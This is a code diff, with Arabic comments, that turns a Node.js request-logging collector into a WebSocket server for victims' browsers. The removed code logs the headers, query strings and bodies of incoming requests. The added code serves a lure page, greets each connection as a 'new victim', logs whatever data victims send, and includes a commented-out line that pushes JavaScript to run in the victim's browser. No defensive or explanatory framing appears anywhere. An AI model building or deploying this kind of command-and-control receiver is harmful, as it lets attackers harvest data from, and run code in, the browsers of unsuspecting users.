@@ -1,29 +1,25 @@
+const WebSocket = require('ws');
+const http = require('http');
 const express = require('express');
+
 const app = express();
-const PORT = 4040;
+const server = http.createServer(app);
+const wss = new WebSocket.Server({ server });
 
-// السماح بقراءة البيانات المرسلة بصيغة JSON أو Form
-app.use(express.json());
-app.use(express.urlencoded({ extended: true }));
+app.use(express.static('public')); // حط صفحة HTML اللي فيها الرابط هنا
 
-// مسار رئيسي لاستقبال البيانات أو فحص الاتصال
-app.all('/', (req, res) => {
-    console.log(`[+] Received ${req.method} request from ${req.ip}`);
-    console.log('Headers:', req.headers);
-    console.log('Query Params:', req.query);
-    console.log('Body Data:', req.body);
+wss.on('connection', (ws) => {
+    console.log('[-] ضحية جديدة دخلت وركبت الاتصال!');
 
-    res.status(200).send({
-        status: 'success',
-        message: 'Data logged successfully',
-        received_data: {
-            query: req.query,
-            body: req.body
-        }
+    ws.on('message', (message) => {
+        console.log(`[البيانات المستلمة]: ${message}`);
     });
+
+    // إرسال أمر للضحية للتنفيذ بالمتصفح
+    // ws.send('alert("تم الاختراق");');
 });
 
-// تشغيل السيرفر على البورت 4040
-app.listen(PORT, () => {
-    console.log(`[+] Server running and listening on http://localhost:${PORT}`);
+const PORT = process.env.PORT || 3000;
+server.listen(PORT, () => {
+    console.log(`السيرفر شغال على البورت ${PORT}`);
 });
